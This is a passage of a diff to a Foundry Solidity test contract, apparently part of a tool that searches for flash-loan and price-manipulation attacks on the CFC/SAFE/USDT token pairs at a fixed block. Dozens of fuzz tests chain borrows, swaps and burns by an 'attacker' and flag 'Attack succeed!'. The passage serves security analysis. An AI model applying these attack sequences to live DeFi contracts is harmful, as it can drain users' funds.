         vm.assume(amt9 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
@@ -1113,7 +1173,7 @@ contract CFCTest is Test, BlockLoader {
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1130,6 +1190,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
@@ -1137,7 +1199,7 @@ contract CFCTest is Test, BlockLoader {
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1154,14 +1216,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1179,15 +1243,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_safe_cfc(amt6, amt7);
-        swap_CakeLP_attacker_cfc_safe(amt8, amt9);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_safe_cfc(amt6, amt7);
+        swap_pair_attacker_cfc_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1205,15 +1271,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
-        burn_cfc_CakeLP(amt7);
-        swap_CakeLP_attacker_cfc_safe(amt8, amt9);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
+        burn_cfc_pair(amt7);
+        swap_pair_attacker_cfc_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1230,6 +1298,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
@@ -1237,7 +1307,7 @@ contract CFCTest is Test, BlockLoader {
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1256,15 +1326,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1281,14 +1353,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1306,15 +1380,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_safe_cfc(amt2, amt3);
-        swap_CakeLP_attacker_cfc_safe(amt4, amt5);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_safe_cfc(amt2, amt3);
+        swap_pair_attacker_cfc_safe(amt4, amt5);
         swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
         swap_safeusdtPair_attacker_usdt_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1332,15 +1408,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_cfc_safe(amt4, amt5);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_cfc_safe(amt4, amt5);
         swap_safeusdtPair_attacker_safe_usdt(amt6, amt7);
         swap_safeusdtPair_attacker_usdt_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1357,14 +1435,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         payback_safe_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1382,15 +1462,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_safe_cfc(amt2, amt3);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_safe_cfc(amt2, amt3);
         swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
         swap_usdtcfc_attacker_usdt_cfc(amt6, amt7);
-        swap_CakeLP_attacker_cfc_safe(amt8, amt9);
+        swap_pair_attacker_cfc_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1408,15 +1490,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        burn_cfc_CakeLP(amt7);
-        swap_CakeLP_attacker_cfc_safe(amt8, amt9);
+        burn_cfc_pair(amt7);
+        swap_pair_attacker_cfc_safe(amt8, amt9);
         payback_safe_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1435,15 +1519,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1460,14 +1546,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1485,15 +1573,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_cfc_safe(amt2, amt3);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_cfc_safe(amt2, amt3);
         swap_safeusdtPair_attacker_safe_usdt(amt4, amt5);
         swap_safeusdtPair_attacker_usdt_safe(amt6, amt7);
-        swap_CakeLP_attacker_safe_cfc(amt8, amt9);
+        swap_pair_attacker_safe_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1511,15 +1601,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        burn_cfc_CakeLP(amt7);
-        swap_CakeLP_attacker_safe_cfc(amt8, amt9);
+        burn_cfc_pair(amt7);
+        swap_pair_attacker_safe_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1538,15 +1630,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1563,14 +1657,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1588,15 +1684,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
-        burn_cfc_CakeLP(amt1);
-        swap_CakeLP_attacker_cfc_safe(amt2, amt3);
-        swap_CakeLP_attacker_safe_cfc(amt4, amt5);
+        burn_cfc_pair(amt1);
+        swap_pair_attacker_cfc_safe(amt2, amt3);
+        swap_pair_attacker_safe_cfc(amt4, amt5);
         swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
         swap_usdtcfc_attacker_usdt_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1614,15 +1712,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        swap_CakeLP_attacker_safe_cfc(amt4, amt5);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
+        burn_cfc_pair(amt3);
+        swap_pair_attacker_safe_cfc(amt4, amt5);
         swap_usdtcfc_attacker_cfc_usdt(amt6, amt7);
         swap_usdtcfc_attacker_usdt_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1639,6 +1739,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
@@ -1646,7 +1748,7 @@ contract CFCTest is Test, BlockLoader {
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1665,15 +1767,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1690,14 +1794,16 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1715,15 +1821,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        burn_cfc_CakeLP(amt5);
-        swap_CakeLP_attacker_cfc_safe(amt6, amt7);
-        swap_CakeLP_attacker_safe_cfc(amt8, amt9);
+        burn_cfc_pair(amt5);
+        swap_pair_attacker_cfc_safe(amt6, amt7);
+        swap_pair_attacker_safe_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1741,15 +1849,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt10
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt10 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
-        burn_cfc_CakeLP(amt7);
-        swap_CakeLP_attacker_safe_cfc(amt8, amt9);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
+        burn_cfc_pair(amt7);
+        swap_pair_attacker_safe_cfc(amt8, amt9);
         payback_cfc_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1766,6 +1876,8 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt9
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt9 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
@@ -1773,7 +1885,7 @@ contract CFCTest is Test, BlockLoader {
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         payback_cfc_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1792,15 +1904,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1819,15 +1933,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1846,15 +1962,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1873,15 +1991,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1900,15 +2020,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_safeusdtPair_attacker_usdt_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1927,15 +2049,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1954,15 +2078,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1981,15 +2107,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2008,15 +2136,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
         swap_usdtcfc_attacker_cfc_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2035,15 +2165,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
         swap_safeusdtPair_attacker_safe_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2062,15 +2194,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2089,15 +2223,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
